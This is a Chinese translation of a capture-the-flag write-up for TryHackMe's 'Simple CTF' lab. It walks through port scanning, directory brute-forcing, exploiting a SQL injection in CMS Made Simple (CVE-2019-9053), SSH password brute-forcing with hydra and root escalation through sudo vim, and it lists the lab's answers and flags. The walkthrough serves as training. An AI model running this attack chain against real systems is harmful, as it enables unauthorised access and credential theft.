<html>
<head>
<title>Simple CTF (Write-up)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">简单CTF(特写)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/simple-ctf-write-up-7940aa287225?source=collection_archive---------0-----------------------#2021-10-30">https://infosecwriteups.com/simple-ctf-write-up-7940aa287225?source=collection_archive---------0-----------------------#2021-10-30</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/6f63a04b65e3b85c03c467bf80dacdc0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*hsjaoY_HaKKc9aoW"/></div></div></figure><h1 id="8eeb" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">介绍</h1><p id="148a" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">这是一个相对容易的<a class="ae lu" href="https://tryhackme.com/room/easyctf" rel="noopener ugc nofollow" target="_blank">房间</a>让你开始使用CTFs，随时可以在<a class="ae lu" href="https://twitter.com/Nouureldin_Ehab" rel="noopener ugc nofollow" target="_blank"> Twitter </a>和<a class="ae lu" href="https://www.linkedin.com/in/noureldin-ehab-a57940190/" rel="noopener ugc nofollow" target="_blank"> Linkedin </a>上问我任何问题</p><h1 id="4736" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">侦察</h1><p id="916b" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">在任何CTF中，我们需要做的第一件事就是使用<a class="ae lu" href="https://nmap.org/" rel="noopener ugc nofollow" target="_blank"> Nmap </a>扫描开放的端口(如果你不知道什么是Nmap，我建议你查看一下<a class="ae lu" href="https://tryhackme.com/room/furthernmap" rel="noopener ugc nofollow" target="_blank">这个房间</a></p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="8b6d" class="me jz iq ma b gy mf mg l mh mi">sudo nmap -sS -sV {Add your machine ip here}</span></pre><p id="ae40" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">-sS标志用于TCP SYN扫描</p><p id="17d7" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">-sV标志用于版本扫描</p><p id="94f7" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">请访问<a class="ae lu" href="https://nmap.org/docs.html" rel="noopener ugc nofollow" target="_blank">文档</a>了解更多关于标志以及如何使用它们的信息</p><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mo"><img src="../Images/5553d1a6b78d67ad8f0ed6e76e24beb4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*915vnJNa5H3nNKOK.png"/></div></div><figcaption class="mp mq gj gh gi mr ms bd b be z dk translated">(这里我们看到端口21(FTP)、88(HTTP)、2222(ssh)是打开的)</figcaption></figure><p id="51cc" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated"><strong class="ky ir">端口1000下运行多少服务？</strong></p><ul class=""><li id="d6f0" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated"><code class="fe nc nd ne ma b">2</code></li><li id="7142" class="mt mu iq ky b kz nf ld ng lh nh ll ni lp nj lt my mz na nb bi translated"><strong class="ky ir">在更高的端口上运行的是什么？</strong></li><li id="ad97" class="mt mu iq ky b kz nf ld ng lh nh ll ni lp nj lt my mz na nb bi translated"><code class="fe nc nd ne ma b">ssh</code></li></ul><p id="8435" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在我们知道了打开的端口，我决定检查它们，让我们从FTP开始</p><p id="71b0" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated"><strong class="ky ir"> FTP(21): </strong> <br/>我试着用FTP连接到机器</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="15b8" class="me jz iq ma b gy mf mg l mh mi">ftp {Add your machine ip here}</span></pre><p id="abe4" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">但结果是一个兔子洞。</p><p id="511c" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated"><strong class="ky ir"> HTTP(88): </strong> <br/>这是一个web服务器，所以我尝试通过在浏览器中写入机器ip地址来连接它</p><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nk"><img src="../Images/f30c1269c58d13e8de98561c0be156ba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*XhX-jQ8Uc9J6GF1X.png"/></div></div></figure><p id="14b9" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">我决定用一个叫做<a class="ae lu" href="https://tools.kali.org/web-applications/dirbuster" rel="noopener ugc nofollow" target="_blank"> dir buster </a>的工具来强行打开这个目录(这是一个预先下载的kali工具，这个工具是由OWASP开发的)</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="cf04" class="me jz iq ma b gy mf mg l mh mi">dirb http://{Add your machine ip here}/</span></pre><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nk"><img src="../Images/da702b7549ec3834ba9bf944cc4e4967.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*dAebWxLfbGLgDcmW.png"/></div></div></figure><p id="e67b" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">太棒了，现在我们发现几个目录，让我们检查一下</p><p id="23ec" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">先说<code class="fe nc nd ne ma b">/simple</code></p><p id="5e5c" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated"><strong class="ky ir">访问:</strong></p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="920a" class="me jz iq ma b gy mf mg l mh mi">http://{Add your machine ip here}/simple/</span></pre><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nk"><img src="../Images/1716db2c4af9173d8041ef961680d30c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*GimIVX-wnprdfDOB.png"/></div></div><figcaption class="mp mq gj gh gi mr ms bd b be z dk translated">(如果你不知道什么是CMS，我真的推荐你阅读这个<a class="ae lu" href="https://kinsta.com/knowledgebase/content-management-system/" rel="noopener ugc nofollow" target="_blank">博客</a></figcaption></figure><p id="e46d" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">正如我们所见，这是一个内容管理器(CMS)，称为“CMS使简单”。让我们看看是否有这个CMS的简历</p><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nl"><img src="../Images/22d98cd67059b58ac0c9682a089a2122.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*aQC85CRYxcNztlof.png"/></div></div></figure><p id="d480" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">如果我们仔细检查网站，我们将能够看到CMS版本(2.2.8)</p><h1 id="a4a3" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">威胁建模</h1><p id="d1ed" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">通过使用一个叫做searchsploit的工具(这是一个搜索著名网站<a class="ae lu" href="https://www.exploit-db.com/searchsploit" rel="noopener ugc nofollow" target="_blank">漏洞数据库</a>寻找CVEs的工具)</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="5e64" class="me jz iq ma b gy mf mg l mh mi">searchsploit cms made simple 2.2.8</span></pre><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nm"><img src="../Images/242b526407187c27f9258a29ca4f4f1f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*onVGVJjWfZ4xRpWE.png"/></div></div><figcaption class="mp mq gj gh gi mr ms bd b be z dk translated">(如果你想了解更多关于SQL注入的信息，查看这个<a class="ae lu" href="https://www.w3schools.com/sql/sql_injection.asp" rel="noopener ugc nofollow" target="_blank">博客</a></figcaption></figure><p id="cdbe" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">因为我们看到它容易受到SQL注入的攻击</p><p id="914e" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">我们可以通过谷歌搜索找到CVE的电话号码</p><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nn"><img src="../Images/12c6f97be9c3665c4765d9060ed22044.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*6GZYSHfVmNbVNskV.png"/></div></div></figure><ul class=""><li id="5463" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated"><strong class="ky ir">你对应用程序使用的CVE是什么？</strong></li><li id="b84f" class="mt mu iq ky b kz nf ld ng lh nh ll ni lp nj lt my mz na nb bi translated"><code class="fe nc nd ne ma b">CVE-2019-9053</code></li></ul><p id="10c4" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">正如我们前面看到的,“CMS变得简单”容易受到SQL注入的攻击</p><ul class=""><li id="233a" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated"><strong class="ky ir">应用程序易受哪种漏洞的攻击？</strong></li><li id="d7e9" class="mt mu iq ky b kz nf ld ng lh nh ll ni lp nj lt my mz na nb bi translated"><code class="fe nc nd ne ma b">SQLi</code></li></ul><h1 id="d37e" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">剥削</h1><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nm"><img src="../Images/fddaacf580c2cadeecce1fde8aa28565.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*iB6y9FPTVIwZaWtP.png"/></div></div></figure><p id="88d8" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在我们将使用我们发现的漏洞，让我们使用我们使用searchsploit发现的python模块</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="c338" class="me jz iq ma b gy mf mg l mh mi">searchsploit -m 46635</span></pre><p id="3e79" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">如果设置了-c标志，python脚本需要一个ip地址和一个可选的单词列表。<br/>(为了避免运行脚本时出现任何问题，请使用python2并确保下载(termcolor和requests)它们是脚本使用的python模块，您可以使用pip install下载它们)</p><p id="607e" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在让我们运行脚本:</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="da95" class="me jz iq ma b gy mf mg l mh mi">python 46635.py -u http://{Add your machine ip here}:80/simple --wordlist=/usr/share/wordlists/rockyou.txt -c</span><span id="fc3b" class="me jz iq ma b gy no mg l mh mi">[+] Salt for password found: 1dac0d92e9fa6bb2<br/>[+] Username found: mitch<br/>[+] Email found: admin@admin.com<br/>[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96</span></pre><p id="a5d7" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在，既然我们有了一个hash，我们可以使用<a class="ae lu" href="https://hashcat.net/hashcat/" rel="noopener ugc nofollow" target="_blank"> HashCat </a>来破解它</p><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi np"><img src="../Images/3b15612beecc8c8ce509a3aa9d63fb64.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*mSCclliSO9HJ8TFu.png"/></div></div></figure><p id="59c3" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">正如我们所见，Hashcat无法破解它，所以我尝试了<a class="ae lu" href="https://www.openwall.com/john/" rel="noopener ugc nofollow" target="_blank">开膛手约翰</a>但也失败了，所以我决定尝试<a class="ae lu" href="https://github.com/vanhauser-thc/thc-hydra" rel="noopener ugc nofollow" target="_blank">九头蛇</a>暴力破解ssh，因为现在我们有了一个用户名(米奇)</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="dd14" class="me jz iq ma b gy mf mg l mh mi">hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://{Add your machine ip here}:2222 -t 4</span></pre><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nq"><img src="../Images/74cafcc051b150dd7ca07ef6fd9b01ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*WaIYFlU8ulvZRjNa.png"/></div></div></figure><ul class=""><li id="71aa" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated"><strong class="ky ir">密码是什么？</strong></li><li id="cd80" class="mt mu iq ky b kz nf ld ng lh nh ll ni lp nj lt my mz na nb bi translated"><code class="fe nc nd ne ma b">secret</code></li><li id="0f2f" class="mt mu iq ky b kz nf ld ng lh nh ll ni lp nj lt my mz na nb bi translated">使用获得的详细信息，您可以在哪里登录？</li><li id="ab52" class="mt mu iq ky b kz nf ld ng lh nh ll ni lp nj lt my mz na nb bi translated"><code class="fe nc nd ne ma b">ssh</code></li></ul><p id="be4b" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在，因为我们知道用户名(mitch)和密码(secret ),所以我们可以使用ssh连接到机器</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="8f48" class="me jz iq ma b gy mf mg l mh mi">ssh mitch@{Add your machine ip here} -p 2222</span></pre><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nr"><img src="../Images/61b9d6156b892f5c7cab3155d6ea5c36.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*x8Cv-QV6vIlSQpD_.png"/></div></div></figure><p id="31c1" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在我们在yaaaaaaaaaaaay</p><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ns"><img src="../Images/f8d78c561bca8a349b072883cc645acf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*wGld25PSwXUP00v_.png"/></div></div></figure><p id="197c" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">当您写下<code class="fe nc nd ne ma b">whoami</code>时，您会看到我们以“mitch”的身份登录</p><p id="ad3f" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在我们将编写<code class="fe nc nd ne ma b">ls</code>来查看当前目录中有哪些文件</p><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nt"><img src="../Images/cea81856bc2ec037573172fe8124a493.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*pmcvlfJtgDm0ZqTY.png"/></div></div></figure><p id="bcf3" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">我们看到只有一个名为“user.txt”的文件</p><p id="ddcb" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">所以我们使用<code class="fe nc nd ne ma b">cat user.txt</code>来运行文件</p><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nu"><img src="../Images/152bf85edb53ba1dad85ef15a3fa7949.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*BWPZBPJOPryPpCXA.png"/></div></div></figure><ul class=""><li id="7d77" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated"><strong class="ky ir">用户标志是什么？</strong></li><li id="6c0a" class="mt mu iq ky b kz nf ld ng lh nh ll ni lp nj lt my mz na nb bi translated"><code class="fe nc nd ne ma b">G00d j0b, keep up!</code></li></ul><p id="147f" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在让我们使用<code class="fe nc nd ne ma b">cd ..</code>转到根目录，然后使用<code class="fe nc nd ne ma b">ls</code>查看除mitch之外是否还有其他用户</p><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ns"><img src="../Images/861b1d2d208482ddccbfa34b8ca3f8fd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*8Jm5JChU17_eB6-G.png"/></div></div></figure><ul class=""><li id="8fb0" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated"><strong class="ky ir">主目录中还有其他用户吗？它叫什么名字？</strong></li><li id="b5a1" class="mt mu iq ky b kz nf ld ng lh nh ll ni lp nj lt my mz na nb bi translated"><code class="fe nc nd ne ma b">Sunbath</code></li></ul><h1 id="08fe" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">利用后(权限提升)</h1><p id="a75a" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">为了有一个更稳定的shell，我们需要运行<code class="fe nc nd ne ma b">/bin/bash</code></p><p id="13d9" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在我们需要运行<code class="fe nc nd ne ma b">sudo -l</code>来查看mitch被允许作为root运行哪些命令</p><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/e486faafcdc0cd3849ce683a8eb8803c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1012/format:webp/0*wuGLZ9dVXssAvg3C.png"/></div></figure><p id="6614" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">在这里，我们注意到我们可以使用root访问权限运行<code class="fe nc nd ne ma b">vim</code>,我发现这个<a class="ae lu" href="https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d" rel="noopener">博客</a>解释了如何使用<code class="fe nc nd ne ma b">vim</code> (-c标志)运行系统命令</p><ul class=""><li id="1dbe" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated"><strong class="ky ir">您可以利用什么来生成特权外壳？</strong></li><li id="3472" class="mt mu iq ky b kz nf ld ng lh nh ll ni lp nj lt my mz na nb bi translated"><code class="fe nc nd ne ma b">vim</code></li></ul><p id="1dea" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在我们将尝试运行<code class="fe nc nd ne ma b">sudo vim -c '!whoami'</code>,看看我们是否是root</p><p id="e601" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">它工作了，现在让我们尝试使用<code class="fe nc nd ne ma b">sudo /usr/bin/vim -c ':!/bin/sh'</code>来创建根外壳</p><p id="0d8d" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在，既然我们是根，让我们运行<code class="fe nc nd ne ma b">ls -la</code></p><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/0705548791bfcc529425b8aab5548d9d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1032/format:webp/0*EDPV3ClwM-cSCqFf.png"/></div></figure><p id="0ef0" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在让我们使用<code class="fe nc nd ne ma b">cat /root/root.txt</code>命令来抓取root.txt文件</p><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div class="gh gi nx"><img src="../Images/883683257846dc0fd180923edc5f3e80.png" data-original-src="https://miro.medium.com/v2/resize:fit:486/format:webp/0*PgJxuvjdZBKPHg_E.png"/></div></figure><ul class=""><li id="ec22" class="mt mu iq ky b kz mj ld mk lh mv ll mw lp mx lt my mz na nb bi translated"><strong class="ky ir">根旗是什么？</strong></li><li id="46ab" class="mt mu iq ky b kz nf ld ng lh nh ll ni lp nj lt my mz na nb bi translated"><code class="fe nc nd ne ma b">W3ll d0n3. You made it!</code></li></ul><h1 id="fd7f" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">我喜欢与不同的人联系，所以如果你想打招呼，我会很高兴见到你！:)</h1><p id="8d1d" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated"><a class="ae lu" href="https://www.linkedin.com/in/noureldin-ehab-a57940190/" rel="noopener ugc nofollow" target="_blank"><strong class="ky ir">LinkedIn</strong></a><strong class="ky ir"><br/></strong><a class="ae lu" href="https://twitter.com/Nouureldin_Ehab" rel="noopener ugc nofollow" target="_blank"><strong class="ky ir">Twitter</strong></a></p></div><div class="ab cl ny nz hu oa" role="separator"><span class="ob bw bk oc od oe"/><span class="ob bw bk oc od oe"/><span class="ob bw bk oc od"/></div><div class="ij ik il im in"><p id="514f" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">🔈🔈Infosec Writeups正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有16个令人难以置信的演讲者和10多个小时充满力量的讨论会议。 <a class="ae lu" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank"> <strong class="ky ir">查看更多详情，在此注册。</strong> </a></p><div class="of og gp gr oh oi"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="oj ab fo"><div class="ok ab ol cl cj om"><h2 class="bd ir gy z fp on fr fs oo fu fw ip bi translated">IWCon2022 - Infosec书面报告虚拟会议</h2><div class="op l"><h3 class="bd b gy z fp on fr fs oo fu fw dk translated">与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…</h3></div><div class="oq l"><p class="bd b dl z fp on fr fs oo fu fw dk translated">iwcon.live</p></div></div><div class="or l"><div class="os l ot ou ov or ow jw oi"/></div></div></a></div></div></div>    
</body>
</html>